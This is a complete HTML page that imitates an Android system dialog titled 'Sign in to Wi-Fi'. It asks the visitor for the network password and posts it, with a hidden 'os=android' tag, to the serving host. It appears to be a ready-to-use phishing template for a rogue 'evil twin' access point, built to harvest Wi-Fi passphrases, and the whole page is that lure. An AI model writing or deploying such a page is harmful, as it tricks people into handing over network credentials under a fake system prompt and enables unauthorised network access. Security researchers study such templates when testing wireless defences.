<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to Wi-Fi</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Roboto', 'Google Sans', Arial, sans-serif;
    background: #fef7ff;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 16px;
  }
  .card {
    background: #fff;
    border-radius: 28px;
    width: 100%;
    max-width: 360px;
    padding: 32px 24px 24px;
    box-shadow: 0 2px 16px rgba(0,0,0,0.1);
  }
  .icon-wrap {
    text-align: center;
    margin-bottom: 20px;
  }
  .title {
    font-size: 22px;
    font-weight: 400;
    color: #1c1b1f;
    text-align: center;
    margin-bottom: 8px;
    letter-spacing: 0;
  }
  .subtitle {
    font-size: 14px;
    color: #49454f;
    text-align: center;
    margin-bottom: 28px;
    line-height: 1.5;
  }
  .outlined-field {
    position: relative;
    margin-bottom: 24px;
  }
  .outlined-field input {
    width: 100%;
    padding: 16px 14px 16px;
    border: 1px solid #79747e;
    border-radius: 4px;
    font-size: 16px;
    font-family: inherit;
    color: #1c1b1f;
    background: transparent;
    outline: none;
    transition: border-color 0.2s;
  }
  .outlined-field input:focus { border-color: #6750a4; border-width: 2px; }
  .outlined-field label {
    position: absolute;
    left: 12px;
    top: -9px;
    background: #fff;
    padding: 0 4px;
    font-size: 12px;
    color: #49454f;
  }
  .outlined-field input:focus + label { color: #6750a4; }
  .actions { display: flex; justify-content: flex-end; gap: 8px; margin-top: 8px; }
  .btn-cancel {
    padding: 10px 24px;
    border: none;
    background: transparent;
    color: #6750a4;
    font-size: 14px;
    font-weight: 500;
    font-family: inherit;
    cursor: pointer;
    border-radius: 20px;
    letter-spacing: 0.1px;
  }
  .btn-cancel:hover { background: rgba(103,80,164,0.08); }
  .btn-connect {
    padding: 10px 24px;
    border: none;
    background: #6750a4;
    color: #fff;
    font-size: 14px;
    font-weight: 500;
    font-family: inherit;
    cursor: pointer;
    border-radius: 20px;
    letter-spacing: 0.1px;
  }
  .btn-connect:hover { background: #7965af; }
</style>
</head>
<body>
<div class="card">
  <div class="icon-wrap">
    <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
      <circle cx="24" cy="24" r="24" fill="#f3edf7"/>
      <path d="M24 31a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5z" fill="#6750a4"/>
      <path d="M17.5 27a9.2 9.2 0 0 1 13 0" stroke="#6750a4" stroke-width="2.2" stroke-linecap="round"/>
      <path d="M12 21.5a17 17 0 0 1 24 0" stroke="#6750a4" stroke-width="2.2" stroke-linecap="round"/>
      <path d="M7 16a24.5 24.5 0 0 1 34 0" stroke="#6750a4" stroke-width="2.2" stroke-linecap="round"/>
    </svg>
  </div>
  <div class="title">Sign in to Wi-Fi</div>
  <div class="subtitle">Your network requires authentication to connect.</div>
  <form method="POST" action="/">
    <input type="hidden" name="os" value="android">
    <div class="outlined-field">
      <input type="password" name="password" id="password" placeholder=" " autocomplete="current-password" autofocus>
      <label for="password">Password</label>
    </div>
    <div class="actions">
      <button type="button" class="btn-cancel" onclick="window.history.back()">Cancel</button>
      <button type="submit" class="btn-connect">Connect</button>
    </div>
  </form>
</div>
</body>
</html>
